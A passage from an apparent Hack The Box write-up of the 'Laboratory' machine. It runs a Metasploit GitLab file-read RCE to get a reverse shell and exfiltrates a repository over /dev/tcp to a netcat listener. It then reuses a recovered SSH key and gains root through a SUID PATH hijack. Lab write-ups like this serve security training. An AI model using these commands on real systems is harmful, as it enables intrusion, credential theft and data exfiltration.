</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.216
</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.216
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">443</span>
</span></span><span class="line"><span class="cl"><span class="nv">RPORT</span> <span class="o">=</span>&gt; <span class="m">443</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> SSL <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Changing the SSL option’s value may require changing RPORT!
</span></span><span class="line"><span class="cl"><span class="nv">SSL</span> <span class="o">=</span>&gt; <span class="nb">true</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> VHOST git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="nv">VHOST</span> <span class="o">=</span>&gt; git.laboratory.htb
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
</span></span><span class="line"><span class="cl"><span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
</span></span></code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.39:9001 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Logged in to user iamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created issue /iamf/hpt2TORA/issues/1
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing arbitrary file load
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File saved as: <span class="s1">&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span class="o">)</span> at 2021-03-21 17:46:14 -0400
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">id<span class="p">;</span>hostname
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span>
</span></span><span class="line"><span class="cl">git.laboratory.htb
</span></span></code></pre></div><p>I have shell as user <code>git</code>.</p>
<p>There is a <code>.dockerenv</code> file in the root directory, which indicates that I&rsquo;m inside a docker container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ls -la /
</span></span><span class="line"><span class="cl">total <span class="m">88</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x   <span class="m">1</span> root root    <span class="m">0</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .dockerenv
</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root  <span class="m">157</span> Feb <span class="m">24</span>  <span class="m">2020</span> RELEASE
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root <span class="m">4096</span> Feb <span class="m">24</span>  <span class="m">2020</span> assets
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-dexter">Shell as dexter</h3>
<h4 id="container-enumeration">Container enumeration</h4>
<p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~$ grep -Ri dexter 2&gt;/dev/null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securedocker
</span></span><span class="line"><span class="cl">git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securewebsite
</span></span></code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</span></span><span class="line"><span class="cl">total <span class="m">40</span>
</span></span><span class="line"><span class="cl">drwxr-s---  <span class="m">6</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-s---  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root   <span class="m">23</span> Jul  <span class="m">5</span>  <span class="m">2020</span> HEAD
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root  <span class="m">107</span> Jul  <span class="m">5</span>  <span class="m">2020</span> config
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root   <span class="m">73</span> Jul  <span class="m">5</span>  <span class="m">2020</span> description
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> hooks
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> info
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root  <span class="m">112</span> Jul  <span class="m">5</span>  <span class="m">2020</span> language-stats.cache
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">14</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> objects
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> refs
</span></span></code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</span></span></code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
</span></span></code></pre></div><p>Back on Laboratory, I’ll send the repository  tarball to my machine using <code>cat</code> and <code>bash</code> trick</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
</span></span></code></pre></div><p>My listener received the tarball.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.39<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.216<span class="o">]</span> <span class="m">42426</span>
</span></span></code></pre></div><h4 id="recovering-securedocker-repository">Recovering &lsquo;securedocker&rsquo; repository</h4>
<p>After extracting the repository,  <code>git:(master)</code> popped up in my zsh prompt which indicates this is a git repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ tar -xzf exfil-securedocker-git.tar
</span></span><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> 19581e27de7ced....5ef03f7c3017bb5b7.git
</span></span><span class="line"><span class="cl">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ 
</span></span></code></pre></div><p>But, when I try to read the repository status, it returns the following errors.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">fatal: this operation must be run in a work tree
</span></span></code></pre></div><blockquote>
<p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p>
</blockquote>
<p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ mkdir .git
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ mv * .git
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">fatal: this operation must be run in a work tree
</span></span></code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git init
</span></span><span class="line"><span class="cl">Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docker.git/.git/
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">On branch master
</span></span><span class="line"><span class="cl">Changes to be committed:
</span></span><span class="line"><span class="cl">  <span class="o">(</span>use <span class="s2">&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span class="o">)</span>
</span></span><span class="line"><span class="cl">        deleted:    README.md
</span></span><span class="line"><span class="cl">        deleted:    create_gitlab.sh
</span></span><span class="line"><span class="cl">        deleted:    dexter/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">        deleted:    dexter/.ssh/id_rsa
</span></span><span class="line"><span class="cl">        deleted:    dexter/recipe.url
</span></span><span class="line"><span class="cl">        deleted:    dexter/todo.txt
</span></span></code></pre></div><p>This repository contains a set of SSH keys that have been deleted. I can restore these with <code>git checkout --</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ git checkout --
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">20</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 ..
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">102</span> Mar <span class="m">22</span> 09:36 recipe.url
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .ssh
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">160</span> Mar <span class="m">22</span> 09:36 todo.txt
</span></span></code></pre></div><h4 id="ssh---dexter">SSH - dexter</h4>
<p>I can now login as <code>dexter</code> using the SSH key I obtained.</p>
<p>At first try, it says the key is invalid format, but this can be fixed wit by adding an empty string (newline) using the <code>echo</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> dexter/.ssh/id_rsa
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
</span></span><span class="line"><span class="cl">Load key <span class="s2">&#34;id_rsa&#34;</span>: invalid format
</span></span><span class="line"><span class="cl">dexter@10.10.10.216: Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
</span></span></code></pre></div><p>Now it logs me in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ssh -i id_rsa dexter@10.10.10.216
</span></span><span class="line"><span class="cl">dexter@laboratory:~$
</span></span><span class="line"><span class="cl">dexter@laboratory:~$ id<span class="p">;</span>hostname
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span>
</span></span><span class="line"><span class="cl">laboratory
</span></span><span class="line"><span class="cl">dexter@laboratory:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root dexter <span class="m">33</span> Mar <span class="m">22</span> 10:06 user.txt
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ cat dexter/todo.txt
</span></span><span class="line"><span class="cl"><span class="c1"># DONE: Secure docker for regular users</span>
</span></span><span class="line"><span class="cl"><span class="c1">### DONE: Automate docker security on startup</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Look into &#34;docker compose&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Permanently ban DeeDee from lab#</span>
</span></span></code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SUID - Check easy privesc, exploits and write perms                                                                                
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root   dexter           17K Aug <span class="m">28</span>  <span class="m">2020</span> /usr/local/bin/docker-security
</span></span></code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command reveals that it uses relative path to call <code>chmod</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:~$ ltrace docker-security 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">setuid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
</span></span><span class="line"><span class="cl">setgid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span class="s1">&#39;/usr/bin/docker&#39;</span>: Operation not permitted
</span></span><span class="line"><span class="cl"> &lt;no <span class="k">return</span> ...&gt;
</span></span><span class="line"><span class="cl">--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
</span></span><span class="line"><span class="cl">&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span class="s1">&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
</span></span><span class="line"><span class="cl"> &lt;no <span class="k">return</span> ...&gt;
</span></span><span class="line"><span class="cl">--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
</span></span><span class="line"><span class="cl">&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
</span></span><span class="line"><span class="cl">+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
</span></span></code></pre></div><p>Knowing this, I could hijack the execution path.</p>
<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
<p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:~$ <span class="nb">cd</span> /dev/shm
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
</span></span></code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it points to my <code>chmod</code> on <code>/dev/shm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:<span class="nv">$PATH</span>
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ which chmod
</span></span><span class="line"><span class="cl">/dev/shm/chmod
</span></span></code></pre></div><p>And now I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ docker-security 
</span></span><span class="line"><span class="cl">root@laboratory:/dev/shm#
</span></span><span class="line"><span class="cl">root@laboratory:/dev/shm# cut -c6- /root/root.txt 
</span></span><span class="line"><span class="cl">9f593f335a0a1f403c753719eb6
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
